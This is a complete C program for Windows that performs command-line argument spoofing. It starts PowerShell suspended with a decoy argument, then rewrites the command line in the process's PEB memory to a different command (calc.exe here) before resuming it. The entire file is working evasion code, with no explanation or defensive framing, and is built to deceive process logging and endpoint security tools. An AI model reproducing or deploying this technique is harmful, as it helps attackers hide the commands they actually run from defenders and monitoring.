#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#define FAKE_ARG	L"powershell.exe -c Write-Host 'I love cats'"
#define REAL_ARG	L"powershell.exe -c calc.exe"

typedef NTSTATUS (NTAPI* NTQUERYINFORMATIONPROCESS)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
);

BOOL ReadMemory(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
	SIZE_T	bytesRead	= NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
	ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &bytesRead);

	return TRUE;
}

BOOL WriteMemory(IN HANDLE hProcess, IN PVOID pAddressWritten, IN PVOID pBuffer, IN DWORD dwBufferSize) {
	SIZE_T bytesWrite	= NULL;

	WriteProcessMemory(hProcess, pAddressWritten, pBuffer, dwBufferSize, &bytesWrite);

	return TRUE;
}

BOOL ArgSpoofing(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	NTSTATUS						STATUS		= NULL;
	WCHAR							szProcess	[MAX_PATH];
	STARTUPINFOW					Si			= { 0 };
	PROCESS_INFORMATION				Pi			= { 0 };
	PROCESS_BASIC_INFORMATION		PBI			= { 0 };
	PPEB							pPeb		= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms		= NULL;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcessStruct = (NTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	lstrcpyW(szProcess, szStartupArgs);

	CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		L"C:\\Windows\\System32\\",
		&Si,
		&Pi);
	printf("[+] PID: %d\n", Pi.dwProcessId);

	NtQueryInformationProcessStruct(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	ReadMemory(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB));
	ReadMemory(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF);
	WriteMemory(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1));

	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);
	ResumeThread(Pi.hThread);
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	return 0;
}

int main(int argc, char* argv[]) {
	HANDLE		hProcess		= NULL,
				hThread			= NULL;
	DWORD		dwProcessId		= NULL;

	ArgSpoofing(FAKE_ARG, REAL_ARG, &dwProcessId, &hProcess, &hThread);

	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}
